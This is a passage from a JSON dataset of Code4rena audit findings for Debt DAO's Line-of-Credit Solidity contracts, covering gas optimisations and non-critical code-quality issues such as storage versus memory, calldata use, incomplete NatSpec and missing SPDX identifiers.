ISpigot(spigot).updateOwnerSplit(revenueContract, defaultSplit);\n\n/// @audit updateOwnerSplit()\n179:              return ISpigot(spigot).updateOwnerSplit(revenueContract, MAX_SPLIT);\n\n/// @audit updateOwner()\n196:            if(!ISpigot(spigot).updateOwner(to)) { revert ReleaseSpigotFailed(); }\n\n/// @audit updateOwner()\n201:            if(!ISpigot(spigot).updateOwner(to)) { revert ReleaseSpigotFailed(); }\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L73\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42969",
      "title": "[G-03]  Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "\nWhen fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n205:            Credit memory credit = credits[id];\n\n323:          Credit memory credit = credits[id];\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L205\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n139:        Credit memory credit = credits[id];\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L139\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42968",
      "title": "[G-02]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit setting\n125:      function addSpigot(address revenueContract, Setting memory setting) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L125\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit credit\n73      function getOutstandingDebt(\n74        ILineOfCredit.Credit memory credit,\n75        bytes32 id,\n76        address oracle,\n77        address interestRate\n78      )\n79        external\n80:       returns (ILineOfCredit.Credit memory c, uint256 principal, uint256 interest)\n\n/// @audit credit\n168     function repay(\n169       ILineOfCredit.Credit memory credit,\n170       bytes32 id,\n171       uint256 amount\n172     )\n173       external\n174:      returns (ILineOfCredit.Credit memory)\n\n/// @audit credit\n202     function withdraw(\n203       ILineOfCredit.Credit memory credit,\n204       bytes32 id,\n205       uint256 amount\n206     )\n207       external\n208:      returns (ILineOfCredit.Credit memory)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L73-L80\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit setting\n125:      function addSpigot(SpigotState storage self, address revenueContract, ISpigot.Setting memory setting) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L125\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42967",
      "title": "[G-01]  State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "\nAvoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). \n\nWhile `string`s are not value types, and therefore cannot be `immutable`/`constant` if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract `abstract` with `virtual` functions for the `string` accessors, and having a child contract override the functions with the hard-coded implementation-specific values.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit registry (constructor)\n16:           registry = FeedRegistryInterface(_registry);\n\n/// @audit registry (access)\n29:           ) = registry.latestRoundData(token, Denominations.USD);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L16\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42966",
      "title": "[N-19]  Return values of `approve()` not checked",
      "impact": "LOW",
      "content": "Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit (valid but excluded finding)\n134:              IERC20(sellToken).approve(swapTarget, amount);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L134\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42965",
      "title": "[N-18]  Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "LOW",
      "content": "\nThe compiler will inline the function, which will avoid `JUMP` instructions usually associated with functions.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n259:          require(interestRate.setRate(id, drate, frate));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L259\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n161:          require(amount > 0);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L161\n\n_______\n\n## Excluded Non-Critical Issues Findings\n\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n| |Issue|Instances|\n|-|:-|:-:|\n| [N&#x2011;19] | Return values of `approve()` not checked | 1 |\n\nTotal: 1 instances over 1 issues\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42964",
      "title": "[N-17]  Not using the named return variables anywhere in the function is confusing",
      "impact": "LOW",
      "content": "\nConsider changing the variable to be an unnamed one.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit claimed\n70        function claimRevenue(address revenueContract, address token, bytes calldata data)\n71            external nonReentrant\n72:           returns (uint256 claimed)\n\n/// @audit claimed\n85        function claimEscrow(address token)\n86            external\n87            nonReentrant\n88:           returns (uint256 claimed) \n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L70-L72\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42963",
      "title": "[N-16]  Event is missing `indexed` fields",
      "impact": "LOW",
      "content": "\nIndex event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n21        event MutualConsentRegistered(\n22            bytes32 _consentHash\n23:       );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L21-L23\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n241       event AddSpigot(\n242           address indexed revenueContract,\n243           uint256 ownerSplit\n244:      );\n\n255       event ClaimRevenue(\n256           address indexed token,\n257           uint256 indexed amount,\n258           uint256 escrowed,\n259           address revenueContract\n260:      );\n\n262       event ClaimEscrow(\n263           address indexed token,\n264           uint256 indexed amount,\n265           address owner\n266:      );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L241-L244\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42962",
      "title": "[N-15]  NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n*There are 56 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/EscrowedLine.sol\n\n/// @audit Missing: '@param newLine'\n82      /**\n83       * see SecuredlLine.rollover\n84       * @notice helper function to allow borrower to easily swithc collateral to a new Line after repyment\n85       *(@dev priviliegad internal function.\n86       * @dev MUST only be callable if line is REPAID\n87       * @return - if function successfully executed\n88      */\n89:     function _rollover(address newLine) internal virtual returns(bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L82-L89\n\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit Missing: '@return'\n216         @param id - the position id for credit position\n217       */\n218:      function _accrue(Credit memory credit, bytes32 id) internal returns(Credit memory) {\n\n/// @audit Missing: '@param status_'\n415       /**\n416         * @notice - updates `status` variable in storage if current status is diferent from existing status.\n417         * @dev - privileged internal function. MUST check params and logic flow before calling\n418         * @dev - does not save new status if it is the same as current status\n419         * @return status - the current status of the line after updating\n420        */\n421:      function _updateStatus(LineLib.STATUS status_) internal returns(LineLib.STATUS) {\n\n/// @audit Missing: '@return'\n433        * @param amount - amount of tokens lender will initially deposit\n434       */\n435       function _createCredit(\n436           address lender,\n437           address token,\n438           uint256 amount\n439       )\n440           internal\n441:          returns (bytes32 id)\n\n/// @audit Missing: '@param credit'\n456     /**\n457      * @dev - Reduces `principal` and/or `interestAccrued` on a credit line.\n458               Expects checks for conditions of repaying and param sanitizing before calling\n459               e.g. early repayment of principal, tokens have actually been paid by borrower, etc.\n460      * @dev - privileged internal function. MUST check params and logic flow before calling\n461      * @param id - position id with all data pertaining to line\n462      * @param amount - amount of Credit Token being repaid on credit line\n463      * @return credit - position struct in memory with updated values\n464     */\n465       function _repay(Credit memory credit, bytes32 id, uint256 amount)\n466           internal\n467:          returns (Credit memory)\n\n/// @audit Missing: '@param credit'\n/// @audit Missing: '@param id'\n477       /**\n478        * @notice - checks that a credit line is fully repaid and removes it\n479        * @dev deletes credit storage. Store any data u might need later in call before _close()\n480        * @dev - privileged internal function. MUST check params and logic flow before calling\n481        * @return credit - position struct in memory with updated values\n482        */\n483:      function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L216-L218\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit Missing: '@return'\n77       * @param targetToken - token in escrow that will be sold of to repay position\n78       */\n79    \n80      function liquidate(\n81        uint256 amount,\n82        address targetToken\n83      )\n84        external\n85        whileBorrowing\n86:       returns(uint256)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L77-L86\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n/// @audit Missing: '@param _line'\n69        /**\n70        * @notice - Allows current owner to transfer ownership to another address\n71        * @dev    - Used if we setup Escrow before Line exists. Line has no way to interface with this function so once transfered `line` is set forever\n72        * @return didUpdate - if function successfully executed or not\n73        */\n74:       function updateLine(address _line) external returns(bool) {\n\n/// @audit Missing: '@return'\n98         * @param token - the token to all borrow to deposit as collateral\n99         */\n100:      function enableCollateral(address token) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L69-L74\n\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit Missing: '@param token'\n19        /**\n20         * @return price - the latest price in USD to 8 decimals\n21         */\n22:       function getLatestAnswer(address token) external returns (int) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L19-L22\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit Missing: '@param token'\n57        /**\n58    \n59         * @notice - Claims revenue tokens from the Spigot (push and pull payments) and escrows them for the Owner withdraw later.\n60                   - Calls predefined function in contract settings to claim revenue.\n61                   - Automatically sends portion to Treasury and then escrows Owner's share\n62                   - There is no conversion or trade of revenue tokens. \n63         * @dev    - Assumes the only side effect of calling claimFunc on revenueContract is we receive new tokens.\n64                   - Any other side effects could be dangerous to the Spigot or upstream contracts.\n65         * @dev    - callable by anyone\n66         * @param revenueContract - Contract with registered settings to claim revenue from\n67         * @param data - Transaction data, including function signature, to properly claim revenue on revenueContract\n68         * @return claimed -  The amount of revenue tokens claimed from revenueContract and split between `owner` and `treasury`\n69        */\n70        function claimRevenue(address revenueContract, address token, bytes calldata data)\n71            external nonReentrant\n72:           returns (uint256 claimed)\n\n/// @audit Missing: '@return'\n106        * @param data - tx data, including function signature, to call contract with\n107        */\n108:      function operate(address revenueContract, bytes calldata data) external returns (bool) {\n\n/// @audit Missing: '@return'\n123        * @param setting - Spigot settings for smart contract   \n124        */\n125:      function addSpigot(address revenueContract, Setting memory setting) external returns (bool) {\n\n/// @audit Missing: '@return'\n135        * @param revenueContract - smart contract to transfer ownership of\n136        */\n137       function removeSpigot(address revenueContract)\n138           external\n139:          returns (bool)\n\n/// @audit Missing: '@return'\n157        * @param newOwner - Address to give control to\n158        */\n159:      function updateOwner(address newOwner) external returns (bool) {\n\n/// @audit Missing: '@return'\n168        * @param newOperator - Address to give control to\n169        */\n170:      function updateOperator(address newOperator) external returns (bool) {\n\n/// @audit Missing: '@return'\n179        * @param newTreasury - Address to divert funds to\n180        */\n181:      function updateTreasury(address newTreasury) external returns (bool) {\n\n/// @audit Missing: '@return'\n192        * @param allowed - true/false whether to allow this function to be called by Operator\n193        */\n194:       function updateWhitelistedFunction(bytes4 func, bool allowed) external returns (bool) {\n\n/// @audit Missing: '@return'\n204        * @param token Revenue token that is being garnished from spigots\n205       */\n206:      function getEscrowed(address token) external view returns (uint256) {\n\n/// @audit Missing: '@return'\n213        * @param func Function to check on whitelist \n214       */\n215   \n216:      function isWhitelisted(bytes4 func) external view returns(bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L57-L72\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@param lender'\n/// @audit Missing: '@param token'\n/// @audit Missing: '@return'\n120     /**\n121       * see ILineOfCredit._createCredit\n122       * @notice called by LineOfCredit._createCredit during every repayment function\n123       * @param oracle - interset rate contract used by line that will calculate interest owed\n124      */\n125     function create(\n126         bytes32 id,\n127         uint256 amount,\n128         address lender,\n129         address token,\n130         address oracle\n131     )\n132         external \n133:        returns(ILineOfCredit.Credit memory credit)\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@return'\n163     /**\n164       * see ILineOfCredit._repay\n165       * @notice called by LineOfCredit._repay during every repayment function\n166       * @param credit - The lender position being repaid\n167      */\n168     function repay(\n169       ILineOfCredit.Credit memory credit,\n170       bytes32 id,\n171       uint256 amount\n172     )\n173       external\n174:      returns (ILineOfCredit.Credit memory)\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@return'\n197     /**\n198       * see ILineOfCredit.withdraw\n199       * @notice called by LineOfCredit.withdraw during every repayment function\n200       * @param credit - The lender position that is being bwithdrawn from\n201      */\n202     function withdraw(\n203       ILineOfCredit.Credit memory credit,\n204       bytes32 id,\n205       uint256 amount\n206     )\n207       external\n208:      returns (ILineOfCredit.Credit memory)\n\n/// @audit Missing: '@param credit'\n/// @audit Missing: '@param id'\n/// @audit Missing: '@return'\n234     /**\n235       * see ILineOfCredit._accrue\n236       * @notice called by LineOfCredit._accrue during every repayment function\n237       * @param interest - interset rate contract used by line that will calculate interest owed\n238      */\n239     function accrue(\n240       ILineOfCredit.Credit memory credit,\n241       bytes32 id,\n242       address interest\n243     )\n244       public\n245:      returns (ILineOfCredit.Credit memory)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L120-L133\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit Missing: '@param self'\n28        /**\n29         * @notice updates the cratio according to the collateral value vs line value\n30         * @dev calls accrue interest on the line contract to update the latest interest payable\n31         * @param oracle - address to call for collateral token prices\n32         * @return cratio - the updated collateral ratio in 4 decimals\n33        */\n34:       function _getLatestCollateralRatio(EscrowState storage self, address oracle) public returns (uint256) {\n\n/// @audit Missing: '@param self'\n46        /**\n47        * @notice - Iterates over all enabled tokens and calculates the USD value of all deposited collateral\n48        * @param oracle - address to call for collateral token prices\n49        * @return totalCollateralValue - the collateral's USD value in 8 decimals\n50        */\n51:       function _getCollateralValue(EscrowState storage self, address oracle) public returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L28-L34\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit Missing: '@param oracle'\n/// @audit Missing: '@param arbiter'\n33        /**\n34          @notice sets up new line based of config of old line. Old line does not need to have REPAID status for this call to succeed.\n35          @dev borrower must call rollover() on `oldLine` with newly created line address\n36          @param oldLine  - line to copy config from for new line.\n37          @param borrower - borrower address on new line\n38          @param ttl      - set total term length of line\n39          @return newLine - address of newly deployed line with oldLine config\n40         */\n41        function rolloverSecuredLine(\n42            address payable oldLine,\n43            address borrower, \n44            address oracle,\n45            address arbiter,\n46            uint ttl\n47:       ) external returns(address) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L33-L47\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit Missing: '@return'\n32         * @param amount - amount of tokens to send\n33         */\n34        function sendOutTokenOrETH(\n35          address token,\n36          address receiver,\n37          uint256 amount\n38        )\n39          external\n40:         returns (bool)\n\n/// @audit Missing: '@return'\n57         * @param amount - amount of tokens to send\n58         */\n59        function receiveTokenOrETH(\n60          address token,\n61          address sender,\n62          uint256 amount\n63        )\n64          external\n65:         returns (bool)\n\n/// @audit Missing: '@return'\n78         * @param token - address of token to check. Denominations.ETH for raw ETH\n79        */\n80:       function getBalance(address token) external view returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L32-L40\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit Missing: '@param spigot'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param defaultSplit'\n163       /**\n164        * @notice Changes the revenue split between a Borrower's treasury and the LineOfCredit based on line health, runs with updateOwnerSplit()\n165        * @dev    - callable `arbiter` + `borrower`\n166        * @param revenueContract - spigot to update\n167        * @return whether or not split was updated\n168        */\n169:      function updateSplit(address spigot, address revenueContract, LineLib.STATUS status, uint8 defaultSplit) external returns (bool) {\n\n/// @audit Missing: '@param spigot'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param borrower'\n/// @audit Missing: '@param arbiter'\n/// @audit Missing: '@param to'\n186       /**\n187   \n188      * @notice -  Transfers ownership of the entire Spigot and its revenuw streams from its then Owner to either \n189                   the Borrower (if a Line of Credit has been been fully repaid) or \n190                   to the Arbiter (if the Line of Credit is liquidatable).\n191      * @dev    - callable by anyone \n192      * @return - whether or not Spigot was released\n193     */\n194:      function releaseSpigot(address spigot, LineLib.STATUS status, address borrower, address arbiter, address to) external returns (bool) {\n\n/// @audit Missing: '@param to'\n/// @audit Missing: '@param token'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param borrower'\n/// @audit Missing: '@param arbiter'\n211     /**\n212      * @notice -  Sends any remaining tokens (revenue or credit tokens) in the Spigot to the Borrower after the loan has been repaid.\n213                -  In case of a Borrower default (loan status = liquidatable), this is a fallback mechanism to withdraw all the tokens and send them to the Arbiter\n214                -  Does not transfer anything if line is healthy\n215      * @return - whether or not spigot was released\n216     */\n217:      function sweep(address to, address token, uint256 amount, LineLib.STATUS status, address borrower, address arbiter) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L163-L169\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42961",
      "title": "[N-14]  File does not contain an SPDX Identifier",
      "impact": "LOW",
      "content": "\n*There are 16 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/EscrowedLine.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L0\n\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L0\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L0\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L0\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L0\n\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L0\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L0\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L0\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L0\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L0\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L0\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L0\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L0\n\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n0:    // forked from https://github.com/IndexCoop/index-coop-smart-contracts/blob/master/contracts/lib/MutualConsent.sol\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L0\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L0\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L0\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42960",
      "title": "[N-13]  Non-library/interface files should use fixed compiler versions, not floating ones",
      "impact": "LOW",
